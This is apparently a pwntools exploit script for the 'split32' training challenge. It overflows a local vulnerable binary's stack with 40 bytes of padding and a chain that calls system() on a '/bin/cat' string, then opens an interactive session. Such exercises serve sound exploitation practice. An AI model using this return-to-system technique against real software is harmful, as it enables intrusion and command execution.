from pwn import *

sh = process("./split32")
# address
bin_cat = p32(0x0804a030)    # '/bin/cat'
system = p32(0x080483e0)     # system()
deadbeef = p32(0xdeadbeef)   # 0xdeadbeef

# payload 
payload = b'a'*40 + deadbeef + system  + deadbeef+ bin_cat

sh.sendline(payload)
sh.interactive()
